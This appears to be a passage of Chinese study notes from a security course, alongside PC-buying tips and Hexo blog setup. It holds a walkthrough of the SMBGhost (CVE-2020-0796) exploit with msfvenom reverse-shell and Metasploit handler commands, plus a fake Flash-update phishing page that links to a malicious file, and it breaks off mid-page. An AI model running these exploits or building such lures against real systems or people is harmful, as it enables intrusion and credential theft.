+<li><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412198-7b68b3ba-2084-4282-a90d-712e8b378b90.png#averageHue=%23f9f8f8&id=KjpPM&originHeight=818&originWidth=1178&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412577-aa68b115-87d8-413d-b7ff-8a481302e9e4.png#averageHue=%23f9f8f7&id=jgLhM&originHeight=1039&originWidth=1227&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608412922-5bbf7acc-637f-4b61-97ab-c72acf196edd.png#averageHue=%23adb1a8&id=qSN0h&originHeight=1020&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413255-d16d0ae5-8100-4c6f-8452-4565d963aa6d.png#averageHue=%23f6f5f4&id=CiJBI&originHeight=809&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413638-c3147eb7-8bda-4b40-b615-8f8270099e95.png#averageHue=%23fbfafa&id=UskyN&originHeight=1281&originWidth=1372&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">google浏览器下载(<a target="_blank" rel="noopener" href="https://www.google.com/chrome/next-steps.html?brand=FKPE&statcb=1&installdataindex=empty&defaultbrowser=0">https://www.google.com/chrome/next-steps.html?brand=FKPE&statcb=1&installdataindex=empty&defaultbrowser=0#</a>)</li>
+<li>google安装SwitchyOmega插件<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608413978-8c7abb1a-2c55-4718-b220-5ae14df90572.png#averageHue=%23a9d6c8&id=nkf69&originHeight=784&originWidth=779&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+</li>
+</ol>
+<p>7、电脑的购买讲解<br />电脑笔记本和台式一般都是组装机<br />一线品牌溢价严重但售后好<br />主看主板（蓝天3），主板坏了就没必要修了，核心，<br />Cpu(由频率决定)和显卡以及硬件内存（买电脑主要这几项）<br />硬盘固态最大装8t（4-5K）建议买4t和1t<br />内存条（32的）16、32（够用了）、64、96（48+48）、128（大部分电脑无法适配）<br />WiFi在同一个网络信号里最好的数字越大越好  如WiFi6<br />电脑由 硬件-驱动（windows系统多）-系统（坏了重装）-用户</p>
+<p>Windows使用  家庭（阉割） 专业（较好）   企业（最好的）  专业工作站（多开）<br />Windows最好装服务器版本   2003（xp）  2008（win7）  2012（win10）2018（win10）<br />大多数企业都用win7（2008）</p>
+<p><a name="OqOng"></a></p>
+<h3 id="1、工作需求-1"><a href="#1、工作需求-1" class="headerlink" title="1、工作需求"></a>1、工作需求</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414338-b26478ce-a87a-48e2-ad5c-b5a1c677a5f6.png#averageHue=%23374148&id=i0XWr&originHeight=452&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />打开qq 后Ctri+alt+f可翻译</p>
+<p><a name="AeDcb"></a></p>
+<h2 id="8、永恒之黑蓝屏-1"><a href="#8、永恒之黑蓝屏-1" class="headerlink" title="8、永恒之黑蓝屏"></a>8、永恒之黑蓝屏</h2><p><a name="qMvim"></a></p>
+<h3 id="1、poc（蓝屏））（观点验证脚本）-1"><a href="#1、poc（蓝屏））（观点验证脚本）-1" class="headerlink" title="1、poc（蓝屏））（观点验证脚本）"></a>1、poc（蓝屏））（观点验证脚本）</h3><p>先在window10虚拟机中的cmd中输入ipconfig查看IPiv4地址；在kali的虚拟机里的cmd中输入pip install ntlm_auth<br />等待一会输入  python .&#x2F;CVE-2020-0796.py 加攻击系统的IP地址回车即可<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414620-2f386c52-7a36-4911-8c96-e2536e887bf9.png#averageHue=%23fefefe&id=APOZb&originHeight=180&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><a name="AST17"></a></p>
+<h3 id="2、exp-rec-1"><a href="#2、exp-rec-1" class="headerlink" title="2、exp(rec)"></a>2、exp(rec)</h3><p>以下是操作流程<br />POC(蓝屏)<br /><a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br />使用<br />pip install ntlm_auth<br />python .&#x2F;CVE-2020-0796.py 192.168.30.134（写入widow10的IP）<br />EXP(RCE)<br /><a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br />msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;（这里写入的是kali的IP） LPORT&#x3D;5556 -b ‘\x00’ -i 5 -f python &gt; exploit<br />使用vim<br />vim exploit 回车<br />:%s&#x2F;buf&#x2F;USER_PAYLOAD 回车<br />:wq! 回车<br />将exploit内容替换到exploit.py<br />参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a><br />msfconsole<br />use exploit&#x2F;multi&#x2F;handler<br />set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br />show options<br />set lhost kali的ip（本机的IP）<br />set lport 5555<br />run<br />python exploit.py -ip 目标（虚拟机的ip）ip<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608414849-572d99b6-7c92-4ce5-97ec-37779183b151.png#averageHue=%23fefefe&id=Xkzeo&originHeight=1022&originWidth=1054&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在第十二行的kali&#x3D;（这里输入kali终端的IP地址输入ifconfig即可在eth1的第二行）<br />上半部分开了一个终端下半部分也开了一个终端，开的两个终端，一个监控一个攻击</p>
+<p><a name="M824S"></a></p>
+<h2 id="9、计算机网络的讲解-1"><a href="#9、计算机网络的讲解-1" class="headerlink" title="9、计算机网络的讲解"></a>9、计算机网络的讲解</h2><p><a name="F7YE5"></a></p>
+<h2 id="1、电脑IP讲解-1"><a href="#1、电脑IP讲解-1" class="headerlink" title="1、电脑IP讲解"></a>1、电脑IP讲解</h2><p>两台电脑联网网线需要手动设置ip<br />广域网全球唯一<br />Ipv4范围0到255.255.255.255（2的八次方）每一都为256<br />扫c段（专业名词）不只扫的IP地址的c段指的是扫d段获取企业买了多少个IP<br />IP地址转换由内网ip通过nat转到公网ip然后出去（回来反之）<br />私网IP<br />A：10.0.0.0-10.255.255.255<br />B；172.16.0.0-172.31.255.255<br />C：192.168.0.0-192.168.255.255<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720608415180-3047b3d1-c515-435f-8abb-7f84ea4bffd7.png#averageHue=%23e4e0cf&id=b3fPj&originHeight=395&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>http    省略：80<br />https   省略：443<br><a name="K8yRG"></a></p>
+<h2 id="2、扫描ip地址-1"><a href="#2、扫描ip地址-1" class="headerlink" title="2、扫描ip地址"></a>2、扫描ip地址</h2><p>在kali终端使用nmap -p 1-10 （加扫描ip地址）<br />如何查询地址ip–&gt;<a target="_blank" rel="noopener" href="https://x.threatbook.com/">https://x.threatbook.com/</a>在此链接里面可以查询IP地址（如以下图注意搜索的网站不带w和其他东西）<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720611376650-121a8601-15ca-44a9-a8f4-761b77f62515.png#averageHue=%23f3f3f2&clientId=u5199405e-cf93-4&from=paste&height=288&id=u6317a16c&originHeight=463&originWidth=572&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&size=47638&status=done&style=none&taskId=u567f0a8e-3ede-454b-a00a-338198afb38&title=&width=355.99078369140625" alt="image.png"><br><a name="qzSfy"></a></p>
+<h1 id="10、利用github搭建hexo博客-1"><a href="#10、利用github搭建hexo博客-1" class="headerlink" title="10、利用github搭建hexo博客"></a>10、利用github搭建hexo博客</h1><p><a name="VFd89"></a></p>
+<h1 id="-2"><a href="#-2" class="headerlink" title=""></a><br /></h1><ol>
+<li>在本地找个目录放博客源文件，路径不要有中文</li>
+<li>在选定的目录中，右键<code>Git Bash Here</code></li>
+<li>使用npm命令安装Hexo，输入：</li>
+</ol>
+<blockquote>
+<p>npm install -g hexo-cli                     &#x2F;&#x2F;安装hexo<br />hexo init blog                                   &#x2F;&#x2F;初始化一个名为blog的项目<br />cd blog                                             &#x2F;&#x2F;进入blog<br />hexo g                                              &#x2F;&#x2F;编译构建</p>
+</blockquote>
+<p><a name="S7c2y"></a></p>
+<h1 id="1、准备前提-1"><a href="#1、准备前提-1" class="headerlink" title="1、准备前提"></a>1、准备前提</h1><p>在虚拟机里面操作完之后要将bolg文件复制到另外一个机器里之后再执行一遍红色的文字</p>
+<ol>
+<li>提前安装好(node.js)[<a target="_blank" rel="noopener" href="https://nodejs.org/en">https://nodejs.org/en</a>] 左边的那个</li>
+<li>提前安装好(GIt)[<a target="_blank" rel="noopener" href="https://git-scm.com/downloads">https://git-scm.com/downloads</a>]</li>
+<li>提前注册好一个github账号</li>
+<li>如果文章图片没有显示，请自行挂代理<br><a name="CWhwn"></a></li>
+</ol>
+<h1 id="2、操作步骤-1"><a href="#2、操作步骤-1" class="headerlink" title="2、操作步骤"></a>2、操作步骤</h1><ol>
+<li>在本地找个目录放博客源文件，路径不要有中文</li>
+<li>在选定的目录中，右键<code>Git Bash Here</code></li>
+<li>使用npm命令安装Hexo，输入：</li>
+</ol>
+<blockquote>
+<p>npm install -g hexo-cli                     &#x2F;&#x2F;安装hexo<br />hexo init blog                                   &#x2F;&#x2F;初始化一个名为blog的项目<br />cd blog                                             &#x2F;&#x2F;进入blog<br />hexo g                                              &#x2F;&#x2F;编译构建</p>
+</blockquote>
+<p>构建好的效果:<br /><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317116.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_23,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#id=flcc2&originHeight=389&originWidth=815&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="4">
+<li><p>cd进入这个目录<br />为了检测我们的网站雏形，分别按顺序输入以下三条命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site                    //博客新建一个文章</span><br><span class="line">hexo g                                   //构建</span><br><span class="line">hexo s                                   //启动服务</span><br><span class="line">之后就可以访问127.0.0.1:4000访问blog了</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置ssh</p>
+</li>
+</ol>
+<blockquote>
+<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥</p>
+</blockquote>
+<ul>
+<li>如果提示：No such file or directory 说明你是第一次使用git。</li>
+</ul>
+<blockquote>
+<p>ssh-keygen -t rsa -C “邮件地址”</p>
+</blockquote>
+<ul>
+<li>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317280.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_35,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#id=EKhuG&originHeight=529&originWidth=1234&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容 <br />● 尝试ssh连接,测试是否成功 </p>
+<p>ssh -T <a href="mailto:git@github.com">git@github.com</a> # 注意邮箱地址不用改</p>
+<p>●如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</p>
+<p>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>●在选中的位置(blog目录下)打开cmd(以管理员身份)</p>
+<p>npm install hexo-deployer-git –save</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1720595849698-166317e8-381d-4e54-88b5-d0a2a7ec7d5c.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp#averageHue=%23100605&from=url&id=FAJuc&originHeight=298&originWidth=543&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>●在上一个Git Bash Here还需要继续配置</p>
+<p>git config –global user.name “luozhixiaowo”&#x2F;&#x2F; 你的github用户名，非昵称 git config –global user.email  “<a href="mailto:xxx@qq.com">xxx@qq.com</a>“&#x2F;&#x2F; 填写你的github注册邮箱</p>
+<p>6准备上传代码</p>
+<p>● 在github上新建一个存储库，命名为github的用户名.github.io<br />● 编辑_config.yml文件，在最后改成这样 </p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303232317329.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_18,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=v0hJy&originHeight=257&originWidth=624&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>● 注意保持格式，缩进不对，会导致一会儿，上传不成功 <br />● 最后上传 </p>
+<p>hexo d每次上传成功之后，需要等待1-3分钟，用来刷新页面</p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303271424650.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_33,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=HZuTX&originHeight=741&originWidth=1159&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>●在创建的存储库的设置中-pages-如图设置 <br /><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303271424773.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_48,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=tgttM&originHeight=683&originWidth=1694&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="7">
+<li>hexo命令介绍</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo g == hexo generate #生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br><span class="line">hexo version  #查看Hexo的版本</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line"></span><br><span class="line">hexo s -g #生成并本地预览</span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>hexo目录结构</li>
+</ol>
+<blockquote>
+<p>+– .deploy      #hexo deploy生成的文件<br />+– node_modules  #npm组件<br />+– public        #生成的静态网页文件<br />+–scaffolds      #模板<br />+– source        #博客正文和其他源文件<br />|  +– _posts    #我们自己写的文章以md结尾<br />+– themes        #主题<br />+– _config.yml  #全局配置文件<br />– package.json  #定义了hexo所需要的各种模块</p>
+</blockquote>
+<ol start="9">
+<li>选择一个自己喜欢的主题，不知道有什么好用的主题可以直接，B站搜<code>HEXO主题</code><br />这里我用的是<a target="_blank" rel="noopener" href="http://yelog.org/2017/03/23/3-hexo-instruction/">3-hexo使用说明 | 叶落阁 (yelog.org)</a> </li>
+<li>关于如何写笔记看下一篇<a target="_blank" rel="noopener" href="https://sunwu57.github.io/2023/03/23/typora+PicGo+LskyPro+Obsidian%E5%AE%9E%E7%8E%B0%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86/">typora+PicGo+LskyPro+Obsidian实现文章管理</a> </li>
+<li><a target="_blank" rel="noopener" href="http://sunwu.world/2023/03/25/markdown%e7%9a%84%e4%bd%bf%e7%94%a8%e8%af%b4%e6%98%8e/">markdown语法实例</a></li>
+</ol>
+<p><a name="Jojie"></a></p>
+<h2 id="11、利用语雀在博客上-上传图片方便-1"><a href="#11、利用语雀在博客上-上传图片方便-1" class="headerlink" title="11、利用语雀在博客上 上传图片方便"></a>11、利用语雀在博客上 上传图片方便</h2><p><a name="WsTSt"></a></p>
+<h3 id="1、语雀上的操作-1"><a href="#1、语雀上的操作-1" class="headerlink" title="1、语雀上的操作"></a>1、语雀上的操作</h3><p>首先要在语雀的编辑好之后进行保存并共享之后，将语雀导出形式为.md形式文件之后，复制粘贴到新建博客文档即可上传。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720694306780-134f2110-9e69-40b5-9e04-bada505755a4.png#averageHue=%23fafafa&clientId=uea942ba3-acca-4&from=paste&height=213&id=u967335f8&originHeight=352&originWidth=761&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=35429&status=done&style=none&taskId=u19dd1ed8-e63f-4b73-b550-6dc1415d47d&title=&width=461.21209455478004" alt="image.png"><br><a name="cNi3y"></a></p>
+<h3 id="2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。-1"><a href="#2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。-1" class="headerlink" title="2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。"></a>2、以下为代码进入编辑即可复制到代码里面图片就可以加载了。</h3><p>解决语雀防盗链<br />blog\node_modules\hexo-theme-landscape\layout_partial\head.ejs加入&#x2F;&#x2F;这个是找寻目的文档添加一段代码在前面找一处粘贴即可。<br /><meta name="referrer" content="no-referrer" />即可，解决图片无法加载的问题<br><a name="YMwr2"></a></p>
+<h2 id="12、falsh钓鱼-1"><a href="#12、falsh钓鱼-1" class="headerlink" title="12、falsh钓鱼"></a>12、falsh钓鱼</h2><p>意思是可以利用网站搭建一个网站但此网站只能在本机代表本机（127.0.0.1）查询（还不知道如和让其他的机器上搜索到）<br />及软件<img src="https://cdn.nlark.com/yuque/0/2024/png/46297250/1720696181075-54014a71-6056-4312-b773-474d0868a6e1.png#averageHue=%2360a7d6&clientId=uea942ba3-acca-4&from=paste&height=71&id=ub0af8cb9&originHeight=117&originWidth=131&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=17301&status=done&style=none&taskId=u127bbe85-5480-4fd9-bf22-266fcecece7&title=&width=79.39393480509355" alt="image.png">打开之后启动Apache2.4.39和MySqL5.7.26<br />文件G:\wanan\phpStudy\phpstudy_pro\WWW在这里</p>
+<p>用index做（ipgin.php）默认访问网页既不用大再打&#x2F;ipgin.php后面这一段进行查询<br><a name="ui2XK"></a></p>
+<h3 id="1、准备一个flash弹窗的js文件-1"><a href="#1、准备一个flash弹窗的js文件-1" class="headerlink" title="1、准备一个flash弹窗的js文件"></a>1、准备一个flash弹窗的js文件<br /><br /></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714218362424-a823fe48-808f-4413-816c-f74676a9471a.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_32,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/format,webp/resize,w_1118,limit_0#averageHue=%239da9a7&from=url&id=LC2sX&originHeight=520&originWidth=1118&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Q3Bns"></a></p>
+<h3 id="2、修改js文件中，立即升级的事件-1"><a href="#2、修改js文件中，立即升级的事件-1" class="headerlink" title="2、修改js文件中，立即升级的事件"></a><br />2、修改js文件中，立即升级的事件<br /><br /></h3><p>Python复制代码<br />1<br />&gt;&lt;divid&#x3D;’button’onclick&#x3D;window.location.href&#x3D;’http:&#x2F;&#x2F;服务器ip&#x2F;path&#x2F;恶意文件’&gt;</div></div></div>“<br><a name="KSWzq"></a></p>
+<h3 id="3、准备一个高仿页面这里我用一个登录页面作为例子-1"><a href="#3、准备一个高仿页面这里我用一个登录页面作为例子-1" class="headerlink" title="3、准备一个高仿页面这里我用一个登录页面作为例子"></a>3、准备一个高仿页面<br />这里我用一个登录页面作为例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        /* 添加更漂亮的样式 */</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: white;</span><br><span class="line">            padding: 40px;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> 20px rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            width: 350px;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">            color: <span class="comment">#4568DC;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">input</span> &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            background-color: <span class="comment">#f2f2f2;</span></span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: 12px;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            opacity: <span class="number">0.9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;欢迎登录&lt;/h1&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;用户名&quot;</span> required&gt;</span><br><span class="line">            &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;密码&quot;</span> required&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a name="sYfOz"></a></p>
+<h3 id="4、在页面中插入我们的js链接插入在login-php-以后基本都用php后缀来上课使用-html自行研究-1"><a href="#4、在页面中插入我们的js链接插入在login-php-以后基本都用php后缀来上课使用-html自行研究-1" class="headerlink" title="4、在页面中插入我们的js链接&lt;script src=&quot;flash.js&quot;&gt;&lt;/script&gt;插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))"></a>4、在页面中插入我们的js链接<br /><code>&lt;script src=&quot;flash.js&quot;&gt;&lt;/script&gt;</code>插入在login.php(以后基本都用php后缀来上课使用    (html自行研究))</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        /* 添加更漂亮的样式 */</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span><br><span class="line">            background-image: linear-gradient(to right, <span class="comment">#4568DC, #B06AB3);</span></span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: 